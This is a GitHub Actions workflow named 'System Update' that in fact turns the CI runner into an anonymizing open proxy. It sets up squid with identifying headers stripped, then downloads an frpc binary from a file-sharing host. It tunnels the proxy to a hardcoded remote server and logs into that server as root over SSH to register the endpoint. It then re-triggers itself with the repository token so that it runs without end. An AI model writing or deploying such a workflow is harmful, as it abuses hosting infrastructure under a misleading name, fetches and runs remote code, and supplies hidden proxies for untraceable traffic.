name: System Update

on:
  workflow_dispatch:
  schedule:
    - cron: '*/15 * * * *'

permissions:
  contents: read
  actions: write

concurrency:
  group: system-update
  cancel-in-progress: false

jobs:
  maintenance:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Setup dependencies
        run: sudo apt update -qq && sudo apt install -y -qq squid sshpass curl

      - name: Configure local service
        run: |
          printf '%s\n' 'http_port 3128' 'acl a src all' 'http_access allow a' 'forwarded_for off' 'via off' 'request_header_access X-Forwarded-For deny all' 'request_header_access Via deny all' 'request_header_access Cache-Control deny all' 'visible_hostname localhost' | sudo tee /etc/squid/squid.conf >/dev/null
          sudo systemctl restart squid
          sleep 3

      - name: Fetch
        run: |
          for i in {1..5}; do
            curl -fL --retry 3 --retry-delay 5 -o a.tar.gz "https://files.catbox.moe/za4auo.gz" && break
            sleep 10
          done
          tar -xzf a.tar.gz
          find . -name "frpc" -type f -exec sudo mv {} /usr/local/bin/ \;
          frpc --version

      - name: Start
        env:
          TOKEN: ${{ secrets.POT }}
        run: |
          cat > frpc.toml <<EOF
          serverAddr = "45.144.53.63"
          serverPort = 7000

          auth.method = "token"
          auth.token = "${TOKEN}"

          [[proxies]]
          name = "p${{ secrets.SPAN }}"
          type = "tcp"
          localIP = "127.0.0.1"
          localPort = 3128
          remotePort = ${{ secrets.SPAN }}
          EOF

          for i in {1..3}; do
            pkill frpc || true
            frpc -c frpc.toml > frpc.log 2>&1 &
            sleep 25
            if grep -qi "start proxy success\|login to server success" frpc.log; then
              break
            fi
            sleep 5
          done
          grep -qi "start proxy success\|login to server success" frpc.log || exit 1

      - name: Get
        env:
          SSEC: ${{ secrets.SECRET }}
        run: |
          FRP_URL="45.144.53.63:${{ secrets.SPAN }}"
          sshpass -p "${SSEC}" ssh -o StrictHostKeyChecking=no root@45.144.53.63 "
            touch /var/www/html/${{ secrets.TXT }}
            grep -Fxq '${FRP_URL}' /var/www/html/${{ secrets.TXT }} || echo '${FRP_URL}' >> /var/www/html/${{ secrets.TXT }}
          "

      - name: Keep alive
        run: sleep 617

      - name: Next cycle
        if: always()
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          sleep 28
          curl -X POST \
            -H "Authorization: Bearer ${GITHUB_TOKEN}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/workflows/main.yml/dispatches \
            -d '{"ref":"main"}'
